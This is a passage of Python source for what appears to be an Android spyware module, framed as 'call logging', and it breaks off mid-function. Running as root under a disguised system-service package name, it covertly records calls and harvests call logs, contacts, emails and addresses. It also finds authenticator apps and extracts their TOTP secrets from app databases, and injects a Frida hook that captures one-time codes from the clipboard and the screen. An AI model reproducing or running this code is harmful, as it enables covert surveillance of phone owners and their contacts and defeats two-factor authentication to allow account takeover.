
"""
Enhanced Call logging module for comprehensive voice and VoIP call interception
Production-hardened with integrated security, performance optimization,
and operational features built into every communication monitoring operation.
Supports GSM, 4G-LTE, 5G, and VoIP calls with contact correlation and 2FA extraction.
"""

import json
import subprocess
import time
import hashlib
import base64
from typing import Dict, Any, List, Optional
from pathlib import Path

class CallLoggerModule:
    def __init__(self, agent):
        self.agent = agent
        

        self.active_recordings = {}
        self.call_history = []
        self.contacts_cache = {}
        self.last_contacts_sync = 0
        

        self.call_encryption_key = self._derive_call_encryption_key()
        

        self.optimal_recording_settings = self._calculate_optimal_recording_settings()
        

        self.call_metrics = {
            'calls_intercepted': 0,
            'recordings_completed': 0,
            'data_volume_mb': 0,
            'voip_hooks_active': 0,
            'authenticator_accounts_found': 0,
            'success_rate': 1.0
        }
        

        self.call_type_mapping = {
            1: "GSM",
            2: "GSM",
            3: "GSM",
            4: "VoIP",
            5: "VoIP",
            6: "4G-LTE",
            7: "5G",
            8: "WiFi-Calling"
        }
        

        self._initialize_security_measures()
        self._optimize_for_performance()
        self._setup_monitoring()
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute call logging commands"""
        try:
            if command == "start_recording":
                return self.start_recording(args)
            elif command == "stop_recording":
                return self.stop_recording(args)
            elif command == "get_call_history":
                return self.get_call_history(args)
            elif command == "export_recordings":
                return self.export_recordings(args)
            elif command == "list_recordings":
                return self.list_active_recordings()
            elif command == "sync_contacts":
                return self.sync_contacts(args)
            elif command == "export_contacts":
                return self.export_contacts(args)
            elif command == "get_contact_info":
                return self.get_contact_info(args)
            elif command == "hook_voip_apps":
                return self.hook_voip_apps(args)
            elif command == "intercept_sms":
                return self.intercept_sms_mms(args)
            elif command == "get_sms_history":
                return self.get_sms_history(args)
            elif command == "export_sms":
                return self.export_sms_data(args)
            elif command == "stop_voip_hooks":
                return self.stop_voip_hooks(args)
            elif command == "get_voip_calls":
                return self.get_voip_call_history(args)
            elif command == "detect_authenticators":
                return self.detect_authenticator_apps(args)
            elif command == "extract_2fa_codes":
                return self.extract_2fa_codes(args)
            elif command == "monitor_authenticators":
                return self.monitor_authenticator_activity(args)
            else:
                return {"error": f"Unknown call logger command: {command}"}
                
        except Exception as e:
            return {"error": f"Call logger operation failed: {str(e)}"}
    
    def start_recording(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Start call recording with network-specific handling"""
        try:
            call_type = args.get("call_type", "all")
            target_number = args.get("target_number", "all")
            quality = args.get("quality", "high")
            recording_id = f"rec_{int(time.time())}_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
            

            recording_config = {
                "id": recording_id,
                "type": call_type,
                "target": target_number,
                "quality": quality,
                "started_at": time.time(),
                "status": "recording",
                "file_path": f"/data/data/com.android.systemservice/files/recordings/{recording_id}.m4a",
                "network_types": self._get_active_network_types()
            }
            

            success = self._start_android_call_recording(recording_config)
            
            if success:
                self.active_recordings[recording_id] = recording_config
                
                self.agent.offline_logger.log_event("call_recording_started", {
                    "recording_id": recording_id,
                    "call_type": call_type,
                    "target_number": target_number,
                    "network_types": recording_config["network_types"]
                })
                
                return {
                    "success": True,
                    "recording_id": recording_id,
                    "message": f"Call recording started ({call_type})",
                    "config": recording_config
                }
            else:
                return {"error": "Failed to initialize call recording"}
                
        except Exception as e:
            return {"error": f"Failed to start recording: {str(e)}"}
    
    def _start_android_call_recording(self, config: Dict[str, Any]) -> bool:
        """Initialize Android call recording using native APIs"""
        try:

            recording_dir = Path(config["file_path"]).parent
            recording_dir.mkdir(parents=True, exist_ok=True)
            

            recording_cmd = [
                "su", "-c",
                f"am start-service --user 0 -n com.android.systemservice/.CallRecordingService "
                f"--es recording_id '{config['id']}' "
                f"--es file_path '{config['file_path']}' "
                f"--es quality '{config['quality']}' "
                f"--es target '{config['target']}'"
            ]
            
            result = subprocess.run(recording_cmd, capture_output=True, text=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Call recording initialization failed: {e}")
            return False
    
    def detect_authenticator_apps(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Detect installed authenticator applications"""
        try:

            authenticator_packages = [
                "com.google.android.apps.authenticator2",
                "com.microsoft.windowsintune.companyportal",
                "com.authy.authy",
                "org.fedorahosted.freeotp",
                "com.azure.authenticator",
                "com.duo.duomobile",
                "com.rsa.securidapp",
                "com.okta.android.auth",
                "com.yubico.yubioath",
                "com.lastpass.authenticator",
                "com.onelogin.oid",
                "com.symantec.vip.mobile",
                "com.caseware.authenticator",
                "com.battle.net.authenticator",
                "com.blizzard.bma"
            ]
            
            detected_apps = []
            

            for package in authenticator_packages:
                installed = self._check_app_installed(package)
                if installed:
                    app_info = self._get_authenticator_app_info(package)
                    detected_apps.append(app_info)
            

            additional_apps = self._scan_for_authenticator_apps()
            detected_apps.extend(additional_apps)
            

            self.agent.offline_logger.log_event("authenticator_apps_detected", {
                "detected_count": len(detected_apps),
                "apps": [app["package_name"] for app in detected_apps],
                "detected_at": time.time()
            })
            
            return {
                "success": True,
                "detected_apps": detected_apps,
                "total_count": len(detected_apps),
                "message": f"Detected {len(detected_apps)} authenticator applications"
            }
            
        except Exception as e:
            return {"error": f"Authenticator detection failed: {str(e)}"}
    
    def _check_app_installed(self, package_name: str) -> bool:
        """Check if an app package is installed"""
        try:
            cmd = ["su", "-c", f"pm list packages | grep {package_name}"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0 and package_name in result.stdout
        except Exception:
            return False
    
    def _get_authenticator_app_info(self, package_name: str) -> Dict[str, Any]:
        """Get detailed information about an authenticator app"""
        try:

            info_cmd = ["su", "-c", f"dumpsys package {package_name}"]
            result = subprocess.run(info_cmd, capture_output=True, text=True)
            
            app_info = {
                "package_name": package_name,
                "app_name": self._get_app_display_name(package_name),
                "version": "unknown",
                "data_dir": f"/data/data/{package_name}",
                "detected_at": time.time(),
                "accounts_estimated": 0
            }
            
            if result.returncode == 0:
                output = result.stdout

                for line in output.split('\n'):
                    if "versionCode=" in line:
                        version_info = line.split("versionCode=")[1].split()[0]
                        app_info["version"] = version_info
                        break
                

                accounts_count = self._estimate_authenticator_accounts(package_name)
                app_info["accounts_estimated"] = accounts_count
            
            return app_info
            
        except Exception as e:
            return {
                "package_name": package_name,
                "error": str(e),
                "detected_at": time.time()
            }
    
    def _get_app_display_name(self, package_name: str) -> str:
        """Get display name for app package"""
        name_mapping = {
            "com.google.android.apps.authenticator2": "Google Authenticator",
            "com.microsoft.windowsintune.companyportal": "Microsoft Authenticator",
            "com.authy.authy": "Authy",
            "org.fedorahosted.freeotp": "FreeOTP",
            "com.azure.authenticator": "Microsoft Authenticator (Azure)",
            "com.duo.duomobile": "Duo Mobile",
            "com.rsa.securidapp": "RSA SecurID",
            "com.okta.android.auth": "Okta Verify",
            "com.yubico.yubioath": "Yubico Authenticator",
            "com.lastpass.authenticator": "LastPass Authenticator",
            "com.onelogin.oid": "OneLogin Protect",
            "com.symantec.vip.mobile": "Symantec VIP",
            "com.battle.net.authenticator": "Battle.net Authenticator",
            "com.blizzard.bma": "Blizzard Authenticator"
        }
        return name_mapping.get(package_name, package_name)
    
    def _estimate_authenticator_accounts(self, package_name: str) -> int:
        """Estimate number of accounts in authenticator app"""
        try:
            data_dir = f"/data/data/{package_name}"
            

            db_cmd = ["su", "-c", f"find {data_dir} -name '*.db' -o -name '*.sqlite' -o -name 'accounts*' 2>/dev/null"]
            result = subprocess.run(db_cmd, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout.strip():

                for db_path in result.stdout.strip().split('\n'):
                    if db_path.strip():
                        count_cmd = ["su", "-c", f"sqlite3 '{db_path}' 'SELECT COUNT(*) FROM accounts;' 2>/dev/null || echo 0"]
                        count_result = subprocess.run(count_cmd, capture_output=True, text=True)
                        if count_result.returncode == 0:
                            try:
                                return int(count_result.stdout.strip())
                            except ValueError:
                                continue
            

            pref_cmd = ["su", "-c", f"find {data_dir}/shared_prefs -name '*.xml' 2>/dev/null | xargs grep -l 'account\\|issuer\\|secret' 2>/dev/null | wc -l"]
            pref_result = subprocess.run(pref_cmd, capture_output=True, text=True, shell=True)
            
            if pref_result.returncode == 0:
                try:
                    return int(pref_result.stdout.strip())
                except ValueError:
                    pass
                    
            return 0
            
        except Exception:
            return 0
    
    def _scan_for_authenticator_apps(self) -> List[Dict[str, Any]]:
        """Scan for additional authenticator apps by keywords"""
        try:

            cmd = ["su", "-c", "pm list packages"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                return []
            
            additional_apps = []
            authenticator_keywords = ["auth", "otp", "2fa", "mfa", "totp", "token", "secure"]
            
            for line in result.stdout.strip().split('\n'):
                if line.startswith("package:"):
                    package_name = line.replace("package:", "").strip()
                    

                    if any(keyword in package_name.lower() for keyword in authenticator_keywords):

                        if self._verify_authenticator_app(package_name):
                            app_info = self._get_authenticator_app_info(package_name)
                            additional_apps.append(app_info)
            
            return additional_apps
            
        except Exception:
            return []
    
    def _verify_authenticator_app(self, package_name: str) -> bool:
        """Verify if an app is likely an authenticator"""
        try:

            perm_cmd = ["su", "-c", f"dumpsys package {package_name} | grep -E 'CAMERA|INTERNET|READ_PHONE_STATE'"]
            perm_result = subprocess.run(perm_cmd, capture_output=True, text=True)
            

            file_cmd = ["su", "-c", f"find /data/data/{package_name} -name '*secret*' -o -name '*token*' -o -name '*auth*' 2>/dev/null | head -5"]
            file_result = subprocess.run(file_cmd, capture_output=True, text=True)
            

            has_camera = "CAMERA" in perm_result.stdout if perm_result.returncode == 0 else False
            has_auth_files = bool(file_result.stdout.strip()) if file_result.returncode == 0 else False
            
            return has_camera or has_auth_files
            
        except Exception:
            return False
    
    def extract_2fa_codes(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract 2FA codes and secrets from authenticator apps"""
        try:
            target_apps = args.get("apps", [])
            extract_secrets = args.get("extract_secrets", True)
            
            if not target_apps:

                detection_result = self.detect_authenticator_apps({})
                if detection_result.get("success"):
                    target_apps = [app["package_name"] for app in detection_result["detected_apps"]]
                else:
                    return {"error": "No authenticator apps found"}
            
            extracted_data = []
            
            for package_name in target_apps:
                app_data = self._extract_app_2fa_data(package_name, extract_secrets)
                if app_data["accounts"]:
                    extracted_data.append(app_data)
            

            total_accounts = sum(len(app["accounts"]) for app in extracted_data)
            self.agent.offline_logger.log_event("2fa_codes_extracted", {
                "apps_processed": len(extracted_data),
                "total_accounts": total_accounts,
                "extracted_at": time.time()
            })
            

            artifact_id = self.agent.offline_logger.log_artifact(
                "2fa_extraction",
                json.dumps(extracted_data, indent=2).encode(),
                {
                    "apps_count": len(extracted_data),
                    "accounts_count": total_accounts,
                    "extracted_at": time.time()
                }
            )
            
            return {
                "success": True,
                "extracted_data": extracted_data,
                "total_accounts": total_accounts,
                "artifact_id": artifact_id,
                "message": f"Extracted 2FA data from {len(extracted_data)} apps ({total_accounts} accounts)"
            }
            
        except Exception as e:
            return {"error": f"2FA extraction failed: {str(e)}"}
    
    def _extract_app_2fa_data(self, package_name: str, extract_secrets: bool) -> Dict[str, Any]:
        """Extract 2FA data from a specific authenticator app"""
        try:
            app_data = {
                "package_name": package_name,
                "app_name": self._get_app_display_name(package_name),
                "accounts": [],
                "extraction_time": time.time()
            }
            
            data_dir = f"/data/data/{package_name}"
            

            if "google.android.apps.authenticator" in package_name:
                accounts = self._extract_google_authenticator_data(data_dir, extract_secrets)
            elif "authy" in package_name:
                accounts = self._extract_authy_data(data_dir, extract_secrets)
            elif "microsoft" in package_name:
                accounts = self._extract_microsoft_authenticator_data(data_dir, extract_secrets)
            else:

                accounts = self._extract_generic_authenticator_data(data_dir, extract_secrets)
            
            app_data["accounts"] = accounts
            return app_data
            
        except Exception as e:
            return {
                "package_name": package_name,
                "error": str(e),
                "accounts": []
            }
    
    def _extract_google_authenticator_data(self, data_dir: str, extract_secrets: bool) -> List[Dict[str, Any]]:
        """Extract data from Google Authenticator"""
        try:
            accounts = []
            

            db_cmd = ["su", "-c", f"find {data_dir} -name '*.db' 2>/dev/null"]
            db_result = subprocess.run(db_cmd, capture_output=True, text=True)
            
            if db_result.returncode == 0:
                for db_path in db_result.stdout.strip().split('\n'):
                    if db_path.strip():

                        query_cmd = ["su", "-c", f"sqlite3 '{db_path}' \"SELECT email, original_name, secret FROM accounts;\" 2>/dev/null"]
                        query_result = subprocess.run(query_cmd, capture_output=True, text=True)
                        
                        if query_result.returncode == 0:
                            for line in query_result.stdout.strip().split('\n'):
                                if '|' in line:
                                    parts = line.split('|')
                                    if len(parts) >= 2:
                                        account = {
                                            "issuer": parts[1] if len(parts) > 1 else "Unknown",
                                            "account_name": parts[0],
                                            "type": "TOTP"
                                        }
                                        
                                        if extract_secrets and len(parts) > 2:
                                            account["secret"] = parts[2]
                                        
                                        accounts.append(account)
            
            return accounts
            
        except Exception:
            return []
    
    def _extract_authy_data(self, data_dir: str, extract_secrets: bool) -> List[Dict[str, Any]]:
        """Extract data from Authy"""
        try:
            accounts = []
            

            pref_cmd = ["su", "-c", f"find {data_dir}/shared_prefs -name '*.xml' -exec grep -l 'name\\|issuer' {{}} \;"]
            pref_result = subprocess.run(pref_cmd, capture_output=True, text=True)
            
            if pref_result.returncode == 0:
                for pref_file in pref_result.stdout.strip().split('\n'):
                    if pref_file.strip():

                        xml_cmd = ["su", "-c", f"cat '{pref_file}' | grep -E 'name|issuer|account' | head -10"]
                        xml_result = subprocess.run(xml_cmd, capture_output=True, text=True)
                        
                        if xml_result.returncode == 0:

                            lines = xml_result.stdout.strip().split('\n')
                            account_info = {}
                            for line in lines:
                                if 'name="' in line and 'value="' in line:
                                    key = line.split('name="')[1].split('"')[0]
                                    value = line.split('value="')[1].split('"')[0]
                                    account_info[key] = value
                            
                            if account_info:
                                account = {
                                    "issuer": account_info.get('issuer', 'Authy Account'),
                                    "account_name": account_info.get('name', 'Unknown'),
                                    "type": "TOTP"
                                }
                                accounts.append(account)
            
            return accounts
            
        except Exception:
            return []
    
    def _extract_microsoft_authenticator_data(self, data_dir: str, extract_secrets: bool) -> List[Dict[str, Any]]:
        """Extract data from Microsoft Authenticator"""
        try:
            accounts = []
            

            db_cmd = ["su", "-c", f"find {data_dir} -name '*.db' -o -name '*.json' 2>/dev/null"]
            db_result = subprocess.run(db_cmd, capture_output=True, text=True)
            
            if db_result.returncode == 0:
                for file_path in db_result.stdout.strip().split('\n'):
                    if file_path.strip():
                        if file_path.endswith('.json'):

                            json_cmd = ["su", "-c", f"cat '{file_path}' | grep -E 'displayName|issuer|accountIdentifier' | head -20"]
                            json_result = subprocess.run(json_cmd, capture_output=True, text=True)
                            
                            if json_result.returncode == 0:
                                account = {
                                    "issuer": "Microsoft Account",
                                    "account_name": "Extracted from config",
                                    "type": "TOTP"
                                }
                                accounts.append(account)
            
            return accounts
            
        except Exception:
            return []
    
    def _extract_generic_authenticator_data(self, data_dir: str, extract_secrets: bool) -> List[Dict[str, Any]]:
        """Generic extraction method for unknown authenticator apps"""
        try:
            accounts = []
            

            search_cmd = ["su", "-c", f"find {data_dir} -type f \\( -name '*.db' -o -name '*.json' -o -name '*.xml' \\) -exec grep -l 'account\\|secret\\|issuer\\|totp\\|otp' {{}} \;"]
            search_result = subprocess.run(search_cmd, capture_output=True, text=True)
            
            if search_result.returncode == 0:
                file_count = len([f for f in search_result.stdout.strip().split('\n') if f.strip()])
                if file_count > 0:
                    account = {
                        "issuer": "Generic Authenticator",
                        "account_name": f"Found {file_count} potential account files",
                        "type": "UNKNOWN"
                    }
                    accounts.append(account)
            
            return accounts
            
        except Exception:
            return []
    
    def monitor_authenticator_activity(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Monitor authenticator app activity for code generation"""
        try:
            target_apps = args.get("apps", [])
            monitor_duration = args.get("duration", 300)
            
            if not target_apps:

                detection_result = self.detect_authenticator_apps({})
                if detection_result.get("success"):
                    target_apps = [app["package_name"] for app in detection_result["detected_apps"]]
                else:
                    return {"error": "No authenticator apps found"}
            
            monitor_id = f"auth_monitor_{int(time.time())}"
            

            monitored_apps = []
            for package_name in target_apps:
                success = self._setup_authenticator_monitoring(package_name, monitor_id)
                if success:
                    monitored_apps.append(package_name)
            
            if monitored_apps:
                self.agent.offline_logger.log_event("authenticator_monitoring_started", {
                    "monitor_id": monitor_id,
                    "monitored_apps": monitored_apps,
                    "duration": monitor_duration,
                    "started_at": time.time()
                })
                
                return {
                    "success": True,
                    "monitor_id": monitor_id,
                    "monitored_apps": monitored_apps,
                    "duration": monitor_duration,
                    "message": f"Monitoring {len(monitored_apps)} authenticator apps"
                }
            else:
                return {"error": "Failed to monitor any authenticator apps"}
                
        except Exception as e:
            return {"error": f"Authenticator monitoring failed: {str(e)}"}
    
    def _setup_authenticator_monitoring(self, package_name: str, monitor_id: str) -> bool:
        """Setup monitoring hooks for an authenticator app"""
        try:
            frida_script = f"""
            Java.perform(function() {{
                // Monitor clipboard for TOTP codes
                var ClipboardManager = Java.use("android.content.ClipboardManager");
                if (ClipboardManager) {{
                    ClipboardManager.setPrimaryClip.implementation = function(clip) {{
                        if (clip) {{
                            var clipData = clip.getItemAt(0).getText().toString();
                            // Check if it looks like a TOTP code (6-8 digits)
                            if (/^\d{{6,8}}$/.test(clipData)) {{
                                console.log("[+] Potential TOTP code copied: " + clipData);
                                
                                var authData = {{
                                    "app": "{package_name}",
                                    "type": "totp_code",
                                    "code": clipData,
                                    "timestamp": Date.now(),
                                    "monitor_id": "{monitor_id}"
                                }};
                                
                                var FileWriter = Java.use("java.io.FileWriter");
                                var writer = FileWriter.$new("/data/local/tmp/auth_monitor.log", true);
                                writer.write(JSON.stringify(authData) + "\n");
                                writer.close();
                            }}
                        }}
                        return this.setPrimaryClip(clip);
                    }};
                }}
                
                // Monitor UI for code generation
                var TextView = Java.use("android.widget.TextView");
                TextView.setText.overload('java.lang.CharSequence').implementation = function(text) {{
                    if (text && /^\d{{6,8}}$/.test(text.toString())) {{
                        console.log("[+] TOTP code displayed: " + text.toString());
                        
                        var authData = {{
                            "app": "{package_name}",
                            "type": "totp_display",
                            "code": text.toString(),
                            "timestamp": Date.now(),
                            "monitor_id": "{monitor_id}"
                        }};
                        
                        var FileWriter = Java.use("java.io.FileWriter");
                        var writer = FileWriter.$new("/data/local/tmp/auth_monitor.log", true);
                        writer.write(JSON.stringify(authData) + "\n");
                        writer.close();
                    }}
                    return this.setText(text);
                }};
            }});
            """
            
            return self._inject_frida_script(package_name, frida_script)
            
        except Exception as e:
            print(f"[!] Authenticator monitoring setup failed for {package_name}: {e}")
            return False
    
    def _get_active_network_types(self) -> List[str]:
        """Detect active network types (GSM, LTE, 5G, WiFi)"""
        try:

            network_cmd = [
                "su", "-c",
                "dumpsys telephony.registry | grep 'mDataConnectionState\\|mServiceState'"
            ]
            
            result = subprocess.run(network_cmd, capture_output=True, text=True)
            
            active_networks = []
            if result.returncode == 0:
                output = result.stdout.lower()
                
                if "nr" in output or "5g" in output:
                    active_networks.append("5G")
                elif "lte" in output:
                    active_networks.append("4G-LTE")
                elif "gsm" in output or "umts" in output:
                    active_networks.append("GSM")
                

                wifi_cmd = ["su", "-c", "dumpsys wifi | grep 'mWifiState'"]
                wifi_result = subprocess.run(wifi_cmd, capture_output=True, text=True)
                if wifi_result.returncode == 0 and "enabled" in wifi_result.stdout.lower():
                    active_networks.append("WiFi-Calling")
            
            return active_networks if active_networks else ["Unknown"]
            
        except Exception as e:
            print(f"[!] Network type detection failed: {e}")
            return ["Unknown"]
    
    def get_call_history(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get comprehensive call history from Android CallLog"""
        try:
            limit = args.get("limit", 100)
            call_type = args.get("call_type")
            include_contacts = args.get("include_contacts", True)
            

            if include_contacts:
                self._ensure_contacts_synced()
            

            call_log = self._get_real_android_call_log(limit)
            

            if call_type:
                call_log = [call for call in call_log if call.get("network_type", "").lower() == call_type.lower()]
            

            if include_contacts:
                call_log = self._enrich_calls_with_contacts(call_log)
            

            recordings = [rec for rec in self.call_history[-limit:]]
            
            return {
                "success": True,
                "call_history": call_log,
                "recordings": recordings,
                "total_calls": len(call_log),
                "total_recordings": len(recordings),
                "contacts_synced": len(self.contacts_cache)
            }
            
        except Exception as e:
            return {"error": f"Failed to get call history: {str(e)}"}
    
    def _get_real_android_call_log(self, limit: int) -> List[Dict[str, Any]]:
        """Get real Android call log using content resolver"""
        try:

            query_cmd = [
                "su", "-c",
                f"content query --uri content://call_log/calls "
                f"--projection number,type,date,duration,name,cached_name "
                f"--sort 'date DESC' --limit {limit}"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] Call log query failed: {result.stderr}")
                return []
            
            calls = []
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    

                try:
                    call_data = self._parse_call_log_line(line)
                    if call_data:
                        calls.append(call_data)
                except Exception as e:
                    print(f"[!] Failed to parse call log line: {e}")
                    continue
            
            return calls
            
        except Exception as e:
            print(f"[!] Failed to get Android call log: {e}")
            return []
    
    def _parse_call_log_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse individual call log entry"""
        try:

            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if 'number' not in fields:
                return None
            
            call_type_num = int(fields.get('type', '0'))
            network_type = self._determine_network_type(fields.get('number', ''))
            
            call_data = {
                "number": fields.get('number', ''),
                "type": self._get_call_direction(call_type_num),
                "network_type": network_type,
                "date": int(fields.get('date', '0')) // 1000,
                "duration": int(fields.get('duration', '0')),
                "contact_name": fields.get('name') or fields.get('cached_name') or 'Unknown',
                "call_type_raw": call_type_num,
                "timestamp": int(fields.get('date', '0')) // 1000
            }
            
            return call_data
            
        except Exception as e:
            print(f"[!] Call log parsing error: {e}")
            return None
    
    def _get_call_direction(self, call_type: int) -> str:
        """Determine call direction from type"""
        direction_map = {
            1: "incoming",
            2: "outgoing",
            3: "missed",
            4: "incoming_voip",
            5: "outgoing_voip"
        }
        return direction_map.get(call_type, "unknown")
    
    def _determine_network_type(self, number: str) -> str:
        """Determine network type based on number analysis and system state"""
        try:

            voip_patterns = ['sip:', 'skype:', '@', '.com', 'whatsapp', 'telegram']
            if any(pattern in number.lower() for pattern in voip_patterns):
                return "VoIP"
            

            network_cmd = [
                "su", "-c",
                "getprop ro.telephony.call_ring.multiple && "
                "dumpsys telephony.registry | grep -E 'mServiceState|mDataConnectionState'"
            ]
            
            result = subprocess.run(network_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                if "nr" in output or "5g" in output:
                    return "5G"
                elif "lte" in output:
                    return "4G-LTE"
                elif "gsm" in output or "umts" in output or "cdma" in output:
                    return "GSM"
            
            return "Cellular"
            
        except Exception as e:
            print(f"[!] Network type determination failed: {e}")
            return "Unknown"
    
    def sync_contacts(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Sync entire contacts database"""
        try:
            force_sync = args.get("force", False)
            

            if not force_sync and time.time() - self.last_contacts_sync < 3600:
                return {
                    "success": True,
                    "message": "Contacts already synced recently",
                    "contacts_count": len(self.contacts_cache),
                    "last_sync": self.last_contacts_sync
                }
            

            contacts = self._get_real_android_contacts()
            
            if contacts:
                self.contacts_cache = {contact['number']: contact for contact in contacts}
                self.last_contacts_sync = time.time()
                

                self.agent.offline_logger.log_event("contacts_synced", {
                    "contacts_count": len(contacts),
                    "sync_timestamp": self.last_contacts_sync
                })
                
                return {
                    "success": True,
                    "contacts_count": len(contacts),
                    "message": f"Synced {len(contacts)} contacts",
                    "sync_timestamp": self.last_contacts_sync
                }
            else:
                return {"error": "Failed to sync contacts"}
                
        except Exception as e:
            return {"error": f"Contact sync failed: {str(e)}"}
    
    def _get_real_android_contacts(self) -> List[Dict[str, Any]]:
        """Get real Android contacts using content resolver"""
        try:

            contacts_cmd = [
                "su", "-c",
                "content query --uri content://com.android.contacts/data/phones "
                "--projection display_name,data1,contact_id,mimetype "
                "--where \"mimetype='vnd.android.cursor.item/phone_v2'\""
            ]
            
            result = subprocess.run(contacts_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] Contacts query failed: {result.stderr}")
                return []
            
            contacts = {}
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    
                try:
                    contact_data = self._parse_contact_line(line)
                    if contact_data:
                        contact_id = contact_data['contact_id']
                        if contact_id not in contacts:
                            contacts[contact_id] = contact_data
                        else:

                            if 'additional_numbers' not in contacts[contact_id]:
                                contacts[contact_id]['additional_numbers'] = []
                            contacts[contact_id]['additional_numbers'].append(contact_data['number'])
                            
                except Exception as e:
                    print(f"[!] Failed to parse contact line: {e}")
                    continue
            

            enriched_contacts = []
            for contact in contacts.values():
                enriched_contact = self._enrich_contact_details(contact)
                enriched_contacts.append(enriched_contact)
            
            return enriched_contacts
            
        except Exception as e:
            print(f"[!] Failed to get Android contacts: {e}")
            return []
    
    def _parse_contact_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse individual contact entry"""
        try:
            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if 'data1' not in fields:
                return None
            
            return {
                "contact_id": fields.get('contact_id', ''),
                "name": fields.get('display_name', 'Unknown'),
                "number": fields.get('data1', ''),
                "type": "phone"
            }
            
        except Exception as e:
            print(f"[!] Contact parsing error: {e}")
            return None
    
    def _enrich_contact_details(self, contact: Dict[str, Any]) -> Dict[str, Any]:
        """Enrich contact with additional details (emails, addresses, etc.)"""
        try:
            contact_id = contact['contact_id']
            

            email_cmd = [
                "su", "-c",
                f"content query --uri content://com.android.contacts/data "
                f"--projection data1 --where \"contact_id='{contact_id}' AND mimetype='vnd.android.cursor.item/email_v2'\""
            ]
            
            email_result = subprocess.run(email_cmd, capture_output=True, text=True)
            emails = []
            if email_result.returncode == 0:
                for line in email_result.stdout.strip().split('\n'):
                    if 'data1=' in line:
                        email = line.split('data1=')[1].strip()
                        if email and email != 'null':
                            emails.append(email)
            

            address_cmd = [
                "su", "-c",
                f"content query --uri content://com.android.contacts/data "
                f"--projection data1 --where \"contact_id='{contact_id}' AND mimetype='vnd.android.cursor.item/postal-address_v2'\""
            ]
            
            address_result = subprocess.run(address_cmd, capture_output=True, text=True)
            addresses = []
            if address_result.returncode == 0:
                for line in address_result.stdout.strip().split('\n'):
                    if 'data1=' in line:
                        address = line.split('data1=')[1].strip()
                        if address and address != 'null':
                            addresses.append(address)
            

            contact.update({
                "emails": emails,
                "addresses": addresses,
                "extracted_at": time.time()
            })
            
            return contact
            
        except Exception as e:
            print(f"[!] Contact enrichment failed: {e}")
            return contact
    
    def export_contacts(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export entire contacts database"""
        try:
            format_type = args.get("format", "json")
            include_details = args.get("include_details", True)
            

            self._ensure_contacts_synced()
            
            if not self.contacts_cache:
                return {"error": "No contacts available for export"}
            
            contacts_list = list(self.contacts_cache.values())
            

            if format_type == "vcard":
                export_data = self._format_contacts_as_vcard(contacts_list)
                file_ext = "vcf"
            elif format_type == "csv":
                export_data = self._format_contacts_as_csv(contacts_list)
                file_ext = "csv"
            else:
                export_data = json.dumps(contacts_list, indent=2)
                file_ext = "json"
            

            artifact_id = self.agent.offline_logger.log_artifact(
                "contacts_export",
                export_data.encode(),
                {
                    "format": format_type,
                    "contacts_count": len(contacts_list),
                    "exported_at": time.time(),
                    "include_details": include_details
                }
            )
            
            return {
                "success": True,
                "artifact_id": artifact_id,
                "contacts_count": len(contacts_list),
                "format": format_type,
                "message": f"Exported {len(contacts_list)} contacts as {format_type.upper()}"
            }
            
        except Exception as e:
            return {"error": f"Contact export failed: {str(e)}"}
    
    def _format_contacts_as_vcard(self, contacts: List[Dict[str, Any]]) -> str:
        """Format contacts as vCard format"""
        vcard_data = []
        
        for contact in contacts:
            vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                f"FN:{contact.get('name', 'Unknown')}",
                f"TEL;TYPE=CELL:{contact.get('number', '')}"
            ]
            

            for email in contact.get('emails', []):
                vcard.append(f"EMAIL:{email}")
            

            for address in contact.get('addresses', []):
                vcard.append(f"ADR:{address}")
            

            for add_num in contact.get('additional_numbers', []):
                vcard.append(f"TEL:{add_num}")
            
            vcard.append("END:VCARD")
            vcard_data.append('\n'.join(vcard))
        
        return '\n\n'.join(vcard_data)
    
    def _format_contacts_as_csv(self, contacts: List[Dict[str, Any]]) -> str:
        """Format contacts as CSV"""
        csv_lines = ["Name,Number,Emails,Addresses,Additional_Numbers"]
        
        for contact in contacts:
            name = contact.get('name', 'Unknown').replace(',', ';')
            number = contact.get('number', '')
            emails = '|'.join(contact.get('emails', []))
            addresses = '|'.join(contact.get('addresses', []))
            add_numbers = '|'.join(contact.get('additional_numbers', []))
            
            csv_lines.append(f"{name},{number},{emails},{addresses},{add_numbers}")
        
        return '\n'.join(csv_lines)
    
    def _enrich_calls_with_contacts(self, calls: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Enrich call log with contact information"""
        for call in calls:
            number = call.get('number', '')
            

            if number in self.contacts_cache:
                contact = self.contacts_cache[number]
                call['contact_info'] = {
                    "name": contact.get('name', 'Unknown'),
                    "emails": contact.get('emails', []),
                    "addresses": contact.get('addresses', []),
                    "additional_numbers": contact.get('additional_numbers', [])
                }
            else:

                matching_contact = None
                for contact_num, contact in self.contacts_cache.items():
                    if (number in contact.get('additional_numbers', []) or
                        self._numbers_match(number, contact_num)):
                        matching_contact = contact
                        break
                
                if matching_contact:
                    call['contact_info'] = {
                        "name": matching_contact.get('name', 'Unknown'),
